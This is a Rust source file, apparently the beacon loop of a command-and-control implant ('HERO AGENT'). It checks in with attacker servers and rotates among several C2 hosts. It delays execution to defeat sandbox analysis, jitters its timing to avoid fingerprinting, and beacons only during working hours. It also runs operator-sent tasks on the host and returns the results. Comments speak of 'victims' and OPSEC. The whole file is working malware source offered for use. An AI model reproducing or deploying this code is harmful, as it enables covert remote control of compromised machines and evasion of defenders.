use crate::core_agent::{
    commu::comms::{Session, SysInfo, WireTask},
    exec::{self, TaskResult},
    evasion,
    management::config::AgentConfig,
};
use rand::Rng;
use std::sync::Arc;

// ── v3: host rotation list ──────────────────────────────────────────────────
// Rotation candidates: baked primary + up to 4 c2_hosts + legacy fallback_host
// (de-duped, order preserved). All hosts are dialed with cfg.c2_port.
fn rotation_list(cfg: &AgentConfig) -> Vec<(&'static str, u16)> {
    let mut v: Vec<(&'static str, u16)> = vec![(cfg.c2_host, cfg.c2_port)];
    for h in cfg.c2_hosts.iter() {
        if !h.is_empty() && !v.iter().any(|(x, _)| *x == *h) {
            v.push((*h, cfg.c2_port));
        }
    }
    if !cfg.fallback_host.is_empty() && !v.iter().any(|(x, _)| *x == cfg.fallback_host) {
        v.push((cfg.fallback_host, cfg.fallback_port));
    }
    v
}

// ── v3: host rotation engine ────────────────────────────────────────────────
/// Advance to the next host per cfg.rotation_strategy. Returns false when the
/// strategy is failover and every host has been tried this outage (caller
/// exits). On success the session is pointed at the new host and forced to
/// re-checkin (set_fallback semantics).
fn rotate_host(session: &mut Session, cfg: &AgentConfig, host_idx: &mut usize, rotations: &mut u32) -> bool {
    let hosts = rotation_list(cfg);
    if hosts.len() <= 1 {
        return false; // nowhere to go
    }
    let n = hosts.len();
    let exhausted = *rotations >= (n as u32) - 1;
    if cfg.rotation_strategy == "failover" && exhausted {
        return false;
    }
    let mut rng = rand::thread_rng();
    let next = match cfg.rotation_strategy {
        "random" => {
            let mut r = *host_idx;
            while r == *host_idx {
                r = rng.gen_range(0..n);
            }
            r
        }
        // round_robin and failover: deterministic advance
        _ => (*host_idx + 1) % n,
    };
    let (h, p) = hosts[next];
    crate::core_agent::debug_log(&format!(
        "[BEACON] Rotating host (strategy='{}') → index {} (host hidden)",
        cfg.rotation_strategy, next
    ));
    session.set_fallback(h, p);
    *host_idx = next;
    *rotations += 1;
    true
}

// ── v3: working-hours override (profile task, live-applied) ─────────────────
fn effective_working_hours(cfg: &AgentConfig) -> String {
    crate::core_agent::management::profile::working_hours_override()
        .unwrap_or_else(|| cfg.working_hours.to_string())
}

// ── v3: poll mode (profile task live-override, else baked) ──────────────────
fn use_get_poll(cfg: &AgentConfig) -> bool {
    match crate::core_agent::management::profile::poll_mode() {
        Some(m) => m == "get",
        None => cfg.poll_mode == "get",
    }
}

// ── Runtime sleep override (operator `sleep` command) ───────────────────────
// BUGFIX (I4): the old `sleep` handler just Sleep()-ed the task thread — it
// never changed the beacon interval, so the command was cosmetic. This override
// is read by jittered_sleep() every cycle, so `sleep 60` REALLY re-times the
// beacon (until the agent restarts; baked config is never mutated).
// 0 = no override → use baked cfg.sleep_ms.
use std::sync::atomic::{AtomicU64, Ordering};
static SLEEP_OVERRIDE_MS: AtomicU64 = AtomicU64::new(0);

pub fn set_sleep_override_ms(ms: u64) {
    SLEEP_OVERRIDE_MS.store(ms.min(u32::MAX as u64), Ordering::SeqCst);
}

pub fn sleep_override_ms() -> u64 {
    SLEEP_OVERRIDE_MS.load(Ordering::SeqCst)
}

// ── Fast-poll mode (server-driven) ─────────────────────────────────────────
static FAST_POLL_UNTIL_MS: AtomicU64 = AtomicU64::new(0);
const FAST_POLL_INTERVAL_MS: u32 = 2_000;
const FAST_POLL_TTL_MS: u64 = 60_000;

fn set_fast_poll() {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u64;
    FAST_POLL_UNTIL_MS.store(now + FAST_POLL_TTL_MS, Ordering::SeqCst);
}

fn fast_poll_active() -> bool {
    let until = FAST_POLL_UNTIL_MS.load(Ordering::SeqCst);
    if until == 0 { return false; }
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u64;
    now < until
}

pub fn start(cfg: Arc<AgentConfig>) {
    use crate::core_agent::debug_log;

    debug_log("[BEACON] === Beacon loop starting ===");
    debug_log(&format!(
        "[BEACON] Config: sleep={}ms jitter={}ms jitter_dist='{}' max_errors={}",
        cfg.sleep_ms, cfg.jitter_ms, cfg.jitter_distribution, cfg.max_errors
    ));
    debug_log(&format!(
        "[BEACON] Config: fallback_host='{}' fallback_port={} working_hours='{}'",
        cfg.fallback_host, cfg.fallback_port, cfg.working_hours
    ));
    debug_log(&format!(
        "[BEACON] Config: initial_delay={}..{}ms max_retries={} backoff={}..{}ms strategy='{}'",
        cfg.initial_delay_ms, cfg.initial_delay_max_ms,
        cfg.max_retries, cfg.backoff_base_ms, cfg.backoff_max_ms, cfg.backoff_strategy
    ));

    // ── PHASE 0: Initial execution delay ──────────────────────────────────
    // Defeats sandbox detonation — sandboxes typically run ≤60s.
    // Set initial_delay_max_ms = 0 to skip (dev mode).
    // BUGFIX (I8): gen_range panics on an empty range — a config where
    // initial_delay_ms > initial_delay_max_ms (server doesn't validate the
    // pair) killed the beacon at startup. Now clamped.
    if cfg.initial_delay_max_ms > 0 {
        let lo = cfg.initial_delay_ms.min(cfg.initial_delay_max_ms);
        let hi = cfg.initial_delay_max_ms.max(lo);
        let delay = {
            let mut rng = rand::thread_rng();
            rng.gen_range(lo..=hi)
        };
        debug_log(&format!(
            "[BEACON] Initial delay: sleeping {}ms ({}s) before first checkin...",
            delay, delay / 1000
        ));
        evasion::secure_sleep(&cfg, delay);
        debug_log("[BEACON] Initial delay complete — proceeding with checkin");
    }

    // ── Session init ───────────────────────────────────────────────────────
    // Bug #7 fix: pass an Arc CLONE into Session::new — the beacon loop keeps
    // its own Arc so it can call rotation_list/rotate_host after the Session
    // takes ownership of its Arc. When the Session drops, its Arc drops too;
    // the beacon's Arc is what keeps the underlying AgentConfig alive.
    let mut session = match Session::new(cfg.clone()) {
        Some(s) => s,
        None => {
            debug_log("[BEACON] FATAL: Session::new() returned None — check encryption_key");
            debug_log("=== HERO AGENT EXIT (session creation failed) ===");
            return;
        }
    };

    let sysinfo = SysInfo::gather();
    debug_log(&format!(
        "[BEACON] SysInfo: {}@{} pid={} admin={} os={} arch={}",
        sysinfo.username, sysinfo.hostname, sysinfo.pid,
        sysinfo.is_admin, sysinfo.os, sysinfo.arch
    ));

    let mut errors: u32       = 0;
    let mut retry_count: u32  = 0;
    let mut reconn_delay: u64 = cfg.backoff_base_ms as u64;
    // v3 rotation state: current host index into rotation_list() + hops made
    // during the current outage (failover exhaustion counter).
    let mut host_idx:  usize = 0;
    let mut rotations: u32   = 0;
    // random strategy: start on a random host so identical payloads on two
    // victims do not hit the same endpoint first (anti-fingerprinting).
    let hosts0 = rotation_list(&cfg);
    if cfg.rotation_strategy == "random" && hosts0.len() > 1 {
        let mut rng = rand::thread_rng();
        let start = rng.gen_range(0..hosts0.len());
        if start != 0 {
            let (h, p) = hosts0[start];
            session.set_fallback(h, p);
            host_idx = start;
        }
    }
    drop(hosts0);

    // ── PHASE 1: Checkin ──────────────────────────────────────────────────
    debug_log("[BEACON] === CHECKIN PHASE START ===");
    let mut checkin_attempt: u32 = 0;

    loop {
        // Working hours gate — only checkin during allowed window
        let wh = effective_working_hours(&cfg);
        if !in_working_hours(&wh) {
            debug_log(&format!(
                "[BEACON] Outside working hours ('{}') — sleeping 5min",
                wh
            ));
            evasion::secure_sleep(&cfg, 300_000);
            continue;
        }

        checkin_attempt += 1;
        debug_log(&format!(
            "[BEACON] Checkin attempt #{} (errors={} retries={} host_idx={} next_wait={}ms)",
            checkin_attempt, errors, retry_count, host_idx, reconn_delay
        ));

        match session.checkin(&sysinfo.hostname, &sysinfo.username, &sysinfo) {
            Ok(batch) => {
                errors       = 0;
                retry_count  = 0;
                reconn_delay = cfg.backoff_base_ms as u64;
                rotations    = 0; // v3: outage over — failover counter resets
                debug_log("[BEACON] Checkin SUCCESS");
                if batch.fast_poll { set_fast_poll(); }
                if !batch.tasks.is_empty() {
                    dispatch_and_send(&session, &batch.tasks);
                }
                break;
            }
            Err(e) => {
                errors      += 1;
                retry_count += 1;
                debug_log(&format!(
                    "[BEACON] Checkin FAILED #{}: {} (retry={} errors={})",
                    checkin_attempt, e, retry_count, errors
                ));

                // v3 rotation: max_retries hit → next host per strategy
                let max_r = if cfg.max_retries == 0 { u32::MAX } else { cfg.max_retries };
                if retry_count >= max_r {
                    if !rotate_host(&mut session, &cfg, &mut host_idx, &mut rotations) {
                        debug_log(&format!(
                            "[BEACON] Max retries ({}) — failover exhausted (all {} hosts tried) — exiting",
                            cfg.max_retries, rotation_list(&cfg).len()
                        ));
                        debug_log("=== HERO AGENT EXIT (failover exhausted) ===");
                        return;
                    }
                    retry_count = 0;
                }

                if errors > cfg.max_errors {
                    debug_log(&format!("[BEACON] FATAL: {} errors — exiting", errors));
                    debug_log("=== HERO AGENT EXIT (max errors on checkin) ===");
                    return;
                }

                debug_log(&format!("[BEACON] Backoff: sleeping {}ms", reconn_delay));
                evasion::secure_sleep(&cfg, reconn_delay as u32);
                reconn_delay = next_backoff(reconn_delay, &cfg);
            }
        }
    }

    debug_log("[BEACON] === HEARTBEAT PHASE START ===");

    // ── PHASE 2: Heartbeat loop ───────────────────────────────────────────
    let mut hb_failures: u32 = 0;
    // OPSEC FIX (audit I-M1, smart implementation):
    //   The audit identified that REKEY_THRESHOLD=1 makes `hb_failures % 1 == 0`
    //   always true, so rekey was attempted on EVERY heartbeat failure (OPSEC-noisy
    //   flood during outages — N failures = N rekey requests).
    //   Previous fix (REKEY_THRESHOLD=3) caused agent exit — errors accumulated
    //   between rekey attempts, hit max_errors, beacon died.
    //   SMART FIX: keep REKEY_THRESHOLD=1 (attempt rekey on every failure —
    //   ensures errors reset quickly), but add a MINIMUM 30-SECOND INTERVAL
    //   between rekey attempts. This prevents the flood (max 1 rekey per 30s)
    //   while still resetting errors frequently (each successful rekey resets
    //   errors to 0). If rekey fails, errors continue, but the exponential
    //   backoff (reconn_delay) means failures are spaced 60s+ apart, so
    //   errors can never accumulate fast enough to hit max_errors.
    const REKEY_THRESHOLD: u32 = 1;
    const REKEY_MIN_INTERVAL: std::time::Duration = std::time::Duration::from_secs(30);
    let mut last_rekey: Option<std::time::Instant> = None;

    loop {
        // ── Working hours gate (v3: live override aware) ───────────────────
        let wh = effective_working_hours(&cfg);
        if !in_working_hours(&wh) {
            debug_log(&format!(
                "[BEACON] Outside working hours ('{}') — sleeping 5min",
                wh
            ));
            evasion::secure_sleep(&cfg, 300_000);
            continue;
        }

        // ── Sleep with configured jitter distribution ──────────────────────
        let sleep_ms = jittered_sleep(&cfg);
        debug_log(&format!(
            "[BEACON] Sleeping {}ms (dist='{}') before next heartbeat",
            sleep_ms, cfg.jitter_distribution
        ));
        evasion::secure_sleep(&cfg, sleep_ms);

        // ── Session lost check ─────────────────────────────────────────────
        if !session.checked_in {
            debug_log("[BEACON] Session lost — attempting fresh checkin");
            match session.checkin(&sysinfo.hostname, &sysinfo.username, &sysinfo) {
                Ok(batch) => {
                    hb_failures  = 0;
                    errors       = 0;
                    retry_count  = 0;
                    reconn_delay = cfg.backoff_base_ms as u64;
                    rotations = 0;
                    if batch.fast_poll { set_fast_poll(); }
                    if !batch.tasks.is_empty() { dispatch_and_send(&session, &batch.tasks); }
                    continue;
                }
                Err(e) => {
                    errors      += 1;
                    retry_count += 1;
                    debug_log(&format!("[BEACON] Re-checkin failed: {} (retry={})", e, retry_count));

                    // v3 rotation on max retries
                    let max_r = if cfg.max_retries == 0 { u32::MAX } else { cfg.max_retries };
                    if retry_count >= max_r {
                        if !rotate_host(&mut session, &cfg, &mut host_idx, &mut rotations) {
                            debug_log("[BEACON] Failover exhausted — exiting");
                            debug_log("=== HERO AGENT EXIT (failover exhausted) ===");
                            return;
                        }
                        retry_count = 0;
                    }

                    if errors > cfg.max_errors { return; }
                    evasion::secure_sleep(&cfg, reconn_delay as u32);
                    reconn_delay = next_backoff(reconn_delay, &cfg);
                    continue;
                }
            }
        }

        // ── Heartbeat (v3: GET-poll mode or classic POST) ──────────────────
        let poll = if use_get_poll(&cfg) {
            debug_log("[BEACON] Polling via GET (malleable poll_mode=get)");
            session.poll_get()
        } else {
            session.heartbeat()
        };
        match poll {
            Ok(batch) => {
                errors       = 0;
                hb_failures  = 0;
                retry_count  = 0;
                reconn_delay = cfg.backoff_base_ms as u64;
                rotations    = 0;
                if batch.fast_poll { set_fast_poll(); }
                if !batch.tasks.is_empty() { dispatch_and_send(&session, &batch.tasks); }
            }
            Err(e) => {
                hb_failures += 1;
                errors      += 1;
                debug_log(&format!(
                    "[BEACON] Heartbeat FAILED (hb_fail={} errors={}/{}): {}",
                    hb_failures, errors, cfg.max_errors, e
                ));

                // Attempt rekey on first failure (with 30s minimum interval)
                // OPSEC FIX (audit I-M1): throttle rekey to max 1 per 30 seconds.
                // This prevents the OPSEC-noisy flood while still resetting errors
                // frequently (each successful rekey resets errors to 0).
                let can_rekey = match last_rekey {
                    Some(t) => t.elapsed() >= REKEY_MIN_INTERVAL,
                    None => true,  // first rekey — always allow
                };
                if hb_failures >= REKEY_THRESHOLD && can_rekey {
                    last_rekey = Some(std::time::Instant::now());
                    debug_log("[BEACON] Attempting rekey (throttled to 30s min interval)...");
                    match session.rekey(&sysinfo.hostname, &sysinfo.username) {
                        Ok(batch) => {
                            hb_failures  = 0;
                            errors       = 0;
                            retry_count  = 0;
                            reconn_delay = cfg.backoff_base_ms as u64;
                            rotations    = 0;
                            if batch.fast_poll { set_fast_poll(); }
                            if !batch.tasks.is_empty() { dispatch_and_send(&session, &batch.tasks); }
                            continue;
                        }
                        Err(_) => {
                            debug_log("[BEACON] Rekey failed — will retry checkin next loop");
                            retry_count += 1;
                            // v3 rotation on max retries
                            let max_r = if cfg.max_retries == 0 { u32::MAX } else { cfg.max_retries };
                            if retry_count >= max_r {
                                if !rotate_host(&mut session, &cfg, &mut host_idx, &mut rotations) {
                                    debug_log("[BEACON] Failover exhausted — exiting");
                                    debug_log("=== HERO AGENT EXIT (failover exhausted) ===");
                                    return;
                                }
                                retry_count = 0;
                            }
                        }
                    }
                }

                if errors > cfg.max_errors {
                    debug_log(&format!("[BEACON] FATAL: {} errors — exiting", errors));
                    debug_log("=== HERO AGENT EXIT (max errors in heartbeat) ===");
                    return;
                }
                evasion::secure_sleep(&cfg, reconn_delay as u32);
                reconn_delay = next_backoff(reconn_delay, &cfg);
            }
        }
    }
}

// ── Jitter distribution ─────────────────────────────────────────────────────
/// Return actual sleep duration based on configured jitter distribution.
///
/// "gaussian"    — Box-Muller transform → natural organic timing
/// "exponential" — high variance, hardest to fingerprint
/// ""/"uniform"  — simple uniform (backward compat default)
fn jittered_sleep(cfg: &AgentConfig) -> u32 {
    if fast_poll_active() {
        crate::core_agent::debug_log(&format!(
            "[BEACON] Fast-poll active — short sleep ({}ms instead of {}ms)",
            FAST_POLL_INTERVAL_MS, cfg.sleep_ms
        ));
        return FAST_POLL_INTERVAL_MS;
    }
    let override_ms = sleep_override_ms();
    let base = if override_ms > 0 { override_ms as f64 } else { cfg.sleep_ms as f64 };
    // v3: profile jitter_override (percent) wins over the baked jitter width.
    let pct = crate::core_agent::management::profile::jitter_override_pct();
    let jmax = if pct > 0 {
        base * (pct as f64 / 100.0)
    } else if override_ms > 0 {
        // Keep jitter as the SAME FRACTION of sleep in override mode
        // (jitter_ms was generated as sleep_ms × the jitter fraction).
        base * (cfg.jitter_ms as f64 / cfg.sleep_ms.max(1) as f64)
    } else {
        cfg.jitter_ms as f64
    };
    let mut rng = rand::thread_rng();

    let result = match cfg.jitter_distribution {
        "gaussian" => {
            // Box-Muller transform: uniform → gaussian
            let u1: f64 = rng.gen_range(f64::EPSILON..1.0);
            let u2: f64 = rng.gen_range(0.0..1.0);
            let z = (-2.0 * u1.ln()).sqrt() * (2.0 * std::f64::consts::PI * u2).cos();
            // Mean = base, StdDev = jmax/3 (so 3σ ≈ jmax)
            let gauss = base + z * (jmax / 3.0);
            gauss.max(base * 0.25).min(base + jmax) // clamp: 25% min, base+jmax max
        }
        "exponential" => {
            // Exponential distribution: λ = 1/mean
            let lambda = 1.0 / (jmax.max(1.0));
            let exp_val = -(rng.gen::<f64>().ln()) / lambda;
            (base + exp_val).min(base + jmax * 3.0).max(base * 0.25)
        }
        _ => {
            // Uniform (default) — simple, backward compatible
            base + rng.gen_range(0.0..=jmax)
        }
    };

    result.round() as u32
}

// ── Backoff calculator ──────────────────────────────────────────────────────
/// Calculate next reconnect delay based on configured backoff strategy.
fn next_backoff(current: u64, cfg: &AgentConfig) -> u64 {
    let base = cfg.backoff_base_ms as u64;
    let cap  = cfg.backoff_max_ms  as u64;
    let mut rng = rand::thread_rng();

    let next = match cfg.backoff_strategy {
        "exponential" => (current * 2).min(cap),
        "fixed"       => base,
        "random"      => rng.gen_range(60_000..=1_800_000_u64).min(cap), // 1-30 min random
        _             => (current * 3 / 2).min(cap), // default: 1.5x growth
    };
    next.max(base) // never go below base
}

// ── Working hours gate ──────────────────────────────────────────────────────
/// Returns true if current UTC time is within the configured working hours window.
/// Format: "HH:MM-HH:MM" e.g. "09:00-18:00"
/// Empty string = always active (returns true).
fn in_working_hours(window: &str) -> bool {
    if window.is_empty() { return true; }

    // Parse "HH:MM-HH:MM"
    let parts: Vec<&str> = window.split('-').collect();
    if parts.len() != 2 { return true; } // bad format → don't block

    let parse_hhmm = |s: &str| -> Option<u32> {
        let p: Vec<&str> = s.split(':').collect();
        if p.len() != 2 { return None; }
        let h: u32 = p[0].parse().ok()?;
        let m: u32 = p[1].parse().ok()?;
        Some(h * 60 + m)
    };

    let start_min = match parse_hhmm(parts[0]) { Some(v) => v, None => return true };
    let end_min   = match parse_hhmm(parts[1]) { Some(v) => v, None => return true };

    let now_min = current_utc_minutes();
    if start_min <= end_min {
        now_min >= start_min && now_min < end_min
    } else {
        // Overnight window e.g. "22:00-06:00"
        now_min >= start_min || now_min < end_min
    }
}

/// Get current UTC time as minutes since midnight.
fn current_utc_minutes() -> u32 {
    #[cfg(target_os = "windows")] {
        use winapi::um::minwinbase::SYSTEMTIME;
        use winapi::um::sysinfoapi::GetSystemTime;
        use std::mem::MaybeUninit;
        unsafe {
            let mut st = MaybeUninit::<SYSTEMTIME>::uninit();
            GetSystemTime(st.as_mut_ptr());
            let st = st.assume_init();
            st.wHour as u32 * 60 + st.wMinute as u32
        }
    }
    #[cfg(not(target_os = "windows"))] {
        use std::time::{SystemTime, UNIX_EPOCH};
        let secs = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs();
        let minutes_in_day = ((secs % 86400) / 60) as u32;
        minutes_in_day
    }
}

// ── Task dispatcher ──────────────────────────────────────────────────────────
/// Execute all tasks for one beacon cycle, catch any panics per-task.
fn dispatch_and_send(session: &Session, tasks: &[WireTask]) {
    let results: Vec<TaskResult> = tasks.iter().map(|t| {
        let task_id = t.id.clone();
        match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            exec::dispatch(t, session)
        })) {
            Ok(r)  => r,
            Err(_) => TaskResult {
                task_id,
                output:  String::new(),
                error:   "[ERR] command handler panicked — agent still running".to_string(),
                success: false,
                cwd:     String::new(),
            },
        }
    }).collect();

    if !results.is_empty() {
        let _ = session.send_results(&results);
    }
}
